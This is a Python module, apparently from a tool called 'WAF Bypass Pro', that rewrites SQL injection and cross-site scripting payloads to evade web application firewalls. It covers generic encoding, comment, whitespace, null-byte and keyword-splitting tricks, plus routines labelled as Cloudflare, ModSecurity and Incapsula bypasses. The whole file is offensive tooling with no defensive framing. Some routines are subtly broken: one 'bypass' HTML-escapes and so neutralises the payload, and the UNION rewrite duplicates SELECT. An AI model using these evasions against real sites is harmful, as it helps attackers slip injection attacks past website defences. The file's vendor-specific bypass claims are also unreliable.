"""
Evasion Engine for WAF Bypass Pro

This module implements various evasion techniques to bypass WAFs.
"""

import urllib.parse
import base64
import html
import random
import re
from typing import Dict, Any, List


class EvasionEngine:
    """Engine for applying various WAF evasion techniques."""
    
    def __init__(self, config: Dict[str, Any], logger):
        """Initialize evasion engine."""
        self.config = config
        self.logger = logger
        
        # Define advanced evasion techniques
        self.techniques = {
            'encoding': self._apply_encoding_evasion,
            'case': self._apply_case_evasion,
            'comment': self._apply_comment_evasion,
            'unicode': self._apply_unicode_evasion,
            'fragmentation': self._apply_fragmentation_evasion,
            'obfuscation': self._apply_obfuscation_evasion,
            'double_encoding': self._apply_double_encoding,
            'hex_encoding': self._apply_hex_encoding,
            'char_function': self._apply_char_function_evasion,
            'whitespace': self._apply_whitespace_evasion,
            'null_byte': self._apply_null_byte_evasion,
            'concat': self._apply_concatenation_evasion
        }
    
    def apply_evasion(self, payload: str, technique: str) -> str:
        """Apply specified evasion technique to payload."""
        self.logger.debug(f"Applying {technique} evasion to payload")
        
        # Handle WAF-specific techniques
        if technique.startswith('waf_specific_'):
            waf_type = technique.replace('waf_specific_', '')
            bypasses = self.apply_waf_specific_bypass(payload, waf_type)
            if bypasses:
                return bypasses[0]  # Return first bypass attempt
            return payload
        
        if technique not in self.techniques:
            self.logger.warning(f"Unknown evasion technique: {technique}")
            return payload
        
        try:
            evaded_payload = self.techniques[technique](payload)
            self.logger.debug(f"Original: {payload}")
            self.logger.debug(f"Evaded: {evaded_payload}")
            return evaded_payload
        except Exception as e:
            self.logger.error(f"Failed to apply {technique} evasion: {str(e)}")
            return payload
    
    def _apply_encoding_evasion(self, payload: str) -> str:
        """Apply URL encoding to the payload."""
        return urllib.parse.quote_plus(payload)
    
    def _apply_case_evasion(self, payload: str) -> str:
        """Randomize case of alphabetic characters."""
        return ''.join(c.upper() if i % 2 == 0 else c.lower() for i, c in enumerate(payload))
    
    def _apply_comment_evasion(self, payload: str) -> str:
        """Insert HTML comments in the payload."""
        return payload.replace(' ', '<!-- comment -->')
    
    def _apply_unicode_evasion(self, payload: str) -> str:
        """Convert each character to a Unicode escape sequence."""
        return ''.join(f'\\u{ord(c):04x}' for c in payload)
    
    def _apply_fragmentation_evasion(self, payload: str) -> str:
        """Split payload into fragments using concatenation."""
        fragments = [f'"{c}"' for c in payload]
        return '+'.join(fragments)
    
    def _apply_obfuscation_evasion(self, payload: str) -> str:
        """Simple reverse the payload string."""
        return payload[::-1]
    
    def _apply_double_encoding(self, payload: str) -> str:
        """Apply double URL encoding."""
        encoded_once = urllib.parse.quote(payload, safe='')
        return urllib.parse.quote(encoded_once, safe='')
    
    def _apply_hex_encoding(self, payload: str) -> str:
        """Convert payload to hex encoding."""
        return ''.join(f'\\x{ord(c):02x}' for c in payload)
    
    def _apply_char_function_evasion(self, payload: str) -> str:
        """Use CHR() function to encode characters (SQL injection specific)."""
        if "'" in payload:
            # Convert to CHAR() functions
            chars = []
            for c in payload:
                if c == "'":
                    chars.append("CHAR(39)")
                elif c.isalnum():
                    chars.append(f"CHAR({ord(c)})")
                else:
                    chars.append(f"CHAR({ord(c)})")
            return "CONCAT(" + ",".join(chars) + ")"
        return payload
    
    def _apply_whitespace_evasion(self, payload: str) -> str:
        """Use alternative whitespace characters."""
        # Replace spaces with tabs, newlines, etc.
        whitespace_chars = ['\t', '\n', '\r', '\v', '\f', '/**/']  
        return payload.replace(' ', random.choice(whitespace_chars))
    
    def _apply_null_byte_evasion(self, payload: str) -> str:
        """Insert null bytes to confuse parsers."""
        return payload.replace("'", "'%00")
    
    def _apply_concatenation_evasion(self, payload: str) -> str:
        """Use string concatenation to break up keywords."""
        # Break up common SQL keywords
        keywords = {
            'SELECT': "'SEL'+'ECT'",
            'UNION': "'UN'+'ION'",
            'INSERT': "'INS'+'ERT'",
            'UPDATE': "'UPD'+'ATE'",
            'DELETE': "'DEL'+'ETE'",
            'DROP': "'DR'+'OP'",
            'CREATE': "'CRE'+'ATE'",
            'ALTER': "'AL'+'TER'",
            'script': "'scr'+'ipt'",
            'alert': "'ale'+'rt'",
            'eval': "'ev'+'al'",
            'document': "'docu'+'ment'"
        }
        
        result = payload
        for keyword, replacement in keywords.items():
            result = result.replace(keyword, replacement)
            result = result.replace(keyword.lower(), replacement.lower())
        
        return result
    
    def get_advanced_bypass_techniques(self) -> List[str]:
        """Get list of advanced bypass techniques for specific WAF types."""
        return [
            'double_encoding', 'hex_encoding', 'char_function', 
            'whitespace', 'null_byte', 'concat', 'encoding', 
            'case', 'unicode', 'fragmentation'
        ]
    
    def apply_waf_specific_bypass(self, payload: str, waf_type: str) -> List[str]:
        """Apply WAF-specific bypass techniques."""
        bypasses = []
        
        if waf_type.lower() == 'cloudflare':
            # Cloudflare-specific bypasses
            bypasses.extend([
                self._cloudflare_bypass_1(payload),
                self._cloudflare_bypass_2(payload),
                self._cloudflare_bypass_3(payload)
            ])
        
        elif waf_type.lower() == 'modsecurity':
            # ModSecurity-specific bypasses
            bypasses.extend([
                self._modsecurity_bypass_1(payload),
                self._modsecurity_bypass_2(payload)
            ])
        
        elif waf_type.lower() == 'incapsula':
            # Incapsula-specific bypasses
            bypasses.extend([
                self._incapsula_bypass_1(payload),
                self._incapsula_bypass_2(payload)
            ])
        
        return [b for b in bypasses if b != payload]
    
    def _cloudflare_bypass_1(self, payload: str) -> str:
        """Cloudflare bypass using mixed case and encoding."""
        # Use mixed case with specific encoding patterns
        result = payload.replace("script", "ScRiPt")
        result = result.replace("alert", "aLeRt")
        result = urllib.parse.quote(result, safe="'()<>")
        return result
    
    def _cloudflare_bypass_2(self, payload: str) -> str:
        """Cloudflare bypass using HTML entities."""
        return payload.replace("<", "&lt;").replace(">", "&gt;").replace('"', "&quot;")
    
    def _cloudflare_bypass_3(self, payload: str) -> str:
        """Cloudflare bypass using Unicode normalization."""
        # Use Unicode lookalikes
        unicode_map = {
            'a': '\u0430',  # Cyrillic a
            'o': '\u043e',  # Cyrillic o
            'p': '\u0440',  # Cyrillic p
            'c': '\u0441',  # Cyrillic c
            'e': '\u0435',  # Cyrillic e
        }
        result = payload
        for ascii_char, unicode_char in unicode_map.items():
            result = result.replace(ascii_char, unicode_char)
        return result
    
    def _modsecurity_bypass_1(self, payload: str) -> str:
        """ModSecurity bypass using SQL comments."""
        return payload.replace(' ', '/**/').replace('=', '/*!50000=*/')
    
    def _modsecurity_bypass_2(self, payload: str) -> str:
        """ModSecurity bypass using nested SQL functions."""
        if 'UNION' in payload.upper():
            return payload.replace('UNION', 'UNION/**/ALL/**/SELECT')
        return payload
    
    def _incapsula_bypass_1(self, payload: str) -> str:
        """Incapsula bypass using parameter pollution."""
        return payload + "&test=1"
    
    def _incapsula_bypass_2(self, payload: str) -> str:
        """Incapsula bypass using content-type manipulation."""
        # This would need to be handled at the request level
        return payload.replace("'", "%27").replace('"', "%22")

